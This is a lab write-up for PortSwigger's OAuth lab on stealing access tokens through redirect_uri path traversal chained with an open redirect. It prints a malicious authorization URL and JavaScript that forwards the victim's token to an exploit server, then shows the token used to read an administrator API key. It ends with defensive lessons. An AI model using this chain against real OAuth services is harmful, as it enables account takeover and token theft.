# OAuth Lab 5 — Stealing OAuth access tokens via an open redirect — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** OAuth 2.0 authentication
**Lab:** Stealing OAuth access tokens via an open redirect
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~04:56 PKT (answer submitted via the lab's own `/submitSolution` endpoint, `{"correct":true}`, banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Access token theft via `redirect_uri` path traversal chained with an open redirect — the OAuth provider validates `redirect_uri` against a whitelist only loosely (extra path characters are allowed), and the blog's `/post/next?path=...` endpoint redirects to any absolute URL, so a victim's implicit-flow access token (sent as a URL fragment) can be forwarded to an attacker server.

## Solution

1. Completed a normal implicit-flow social login as `wiener:peter` via `/my-account` (establishes the provider session). The callback page's JavaScript calls `GET https://<oauth>/me` with `Authorization: Bearer <token>` — the response includes the user's `apikey`.
2. Proved the traversal: an `/auth` request with `redirect_uri` set to `<lab>/oauth-callback/../post?postId=1` was accepted and the provider redirected to the blog post with `#access_token=<token>` in the fragment.
3. Built the malicious authorization URL that chains the traversal into the open redirect:
   ```
   https://oauth-<id>.oauth-server.net/auth?client_id=<id>
     &redirect_uri=https://<lab>/oauth-callback/../post/next?path=https://<exploit-server>/exploit
     &response_type=token&nonce=<n>&scope=openid%20profile%20email
   ```
4. Stored this two-part exploit on the lab's own exploit server and delivered it to the victim:
   ```html
   <script>
       if (!document.location.hash) {
           window.location = '<malicious-auth-url>';
       } else {
           window.location = '/?' + document.location.hash.substr(1);
       }
   </script>
   ```
   Chain: victim loads `/exploit` (no hash) → redirected to the auth URL → provider redirects to `/post/next?path=<exploit-server>/exploit#access_token=<victim-token>` → the open redirect forwards to the exploit server with the fragment → the script reads the fragment and leaks it with `GET /?access_token=<victim-token>`, which lands in the exploit server's access log.
5. Read the victim's token from the access log, then called the userinfo endpoint with it:
   ```
   GET https://oauth-<id>.oauth-server.net/me
   Authorization: Bearer <victim-token>
   → {"sub":"administrator","apikey":"<admin-api-key>",...}
   ```
6. Submitted the admin's API key with `POST /submitSolution` (`answer=<key>`) — the response was `{"correct":true}` and the home page showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the implicit flow puts the access token in the URL fragment, which survives redirects and is visible to any page the browser lands on. The traversal (`/../`) escapes the whitelisted callback path, and the open redirect (`/post/next?path=`) carries the fragment to the attacker's server.
- **Why the fragment matters:** fragments are never sent to the server in the request itself — that is why the exploit needs JavaScript (`document.location.hash`) to turn the fragment into a query string the access log can record.
- **The key detail:** each link in the chain is individually "minor" (loose whitelist check, open redirect, fragment in URL) — together they deliver the victim's token to the attacker.

## Lessons Learned

- Validate `redirect_uri` with an exact match against the registered whitelist — never allow appended path segments or traversal sequences.
- Never implement an open redirect (`/post/next?path=` accepting absolute URLs); if a redirect parameter is needed, allowlist the destinations.
- The implicit flow is deprecated for exactly this reason — use the authorization code flow with PKCE, where tokens are never exposed in the browser URL.
